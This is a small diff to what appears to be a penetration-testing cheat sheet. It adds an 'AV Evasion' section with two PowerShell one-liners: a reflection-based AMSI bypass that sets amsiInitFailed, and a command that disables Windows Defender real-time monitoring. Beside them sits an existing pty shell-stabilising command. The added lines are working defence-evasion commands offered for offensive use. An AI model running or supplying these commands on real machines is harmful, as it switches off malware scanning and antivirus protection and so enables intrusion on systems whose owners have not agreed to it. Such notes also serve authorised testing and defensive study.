@@ -1,4 +1,14 @@
+# AV Evasion
+
 # Stablize Shell
+```powershell
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+# Disable real-time protection on windows.
+```powershell
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
